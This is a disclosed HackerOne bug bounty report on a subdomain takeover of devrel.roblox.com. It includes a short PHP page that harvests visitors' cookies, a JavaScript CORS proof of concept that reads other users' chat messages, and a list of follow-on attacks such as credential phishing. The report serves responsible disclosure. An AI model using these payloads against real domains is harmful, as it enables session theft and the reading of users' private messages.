# Subdomain Takeover to Authentication bypass 

## Report Details
- **Report ID**: 335330
- **URL**: https://hackerone.com/reports/335330
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2018-04-09T23:07:41.314Z
- **Disclosed**: 2020-04-23T20:50:11.710Z

## Reporter
- **Username**: geekboy
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: roblox

## Vulnerability Information
## Vulnerability Type: 
-----------
Subdomain Takeover

## Description: 
-----------
Due to unclaimed or expired Hubspot instance an attacker is able to claim and serve content from `devrel.roblox.com` and perform different kind of attacks which i shared in impact section.

## Affected Area: 
-----------
http://devrel.roblox.com

## Steps to Reproduce:
-----------
+ Visit: https://devrel.roblox.com/subdomain-takeover

{F283580}

## Mitigation:
-----------
+ Remove the CNAME entry for the `devrel.roblox.com`

## Impact

Let's talk about about in details, as attacker could possible takeover other users account. 

1. As `.ROBLOSECURITY` cookies is scoped to `*.roblox.com` means same cookies shared with all other subdomain, i'm not much familiar with hubspot with hosting following code on will steal all the users cookie who visit this subdomain.

{F283554}

###steal_cookie.php

```php
<html>
<body>
<?php
echo "Cookies received: <br>";

foreach ($_COOKIE as $key=>$val)
  {
    echo "Set-Cookie: $key=$val; Domain=.roblox.com; path=/<br>\n";
  }
?>
</body>
</html>
``` 

2. Also `devrel.roblox.com` can be used to read all the chats between other users as 
 `devrel.roblox.com` is also white listed to make CORS request at  `chat.roblox.com` 

{F283553}

Which can be done like this: 

````html

<h2>CORS To Read Chat</h2>
<div id="demo">
<button type="button" onclick="cors()">Chat Reader @ Roblox</button>
</div>
 
<script>
function cors() {
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      document.getElementById("demo").innerHTML = document.write(this.responseText);
    }
  };
  xhttp.open("GET", "https://chat.roblox.com/v2/get-messages?conversationId=469104576&pageSize=3", true);
  xhttp.withCredentials = true;
  xhttp.send();
}
</script>
 ````

Apart form all above issue, attacker can do following things as well.
+ Creating fake login page for credentials harvesting.
+ Sharing malicious files using roblox.
+ Creating mail account using GSuite to send and recived emails on behalf of `*@devrel.roblox.com`

## Attachments
- reading_chats.PNG
- shared_cookie.PNG
- takeover.PNG
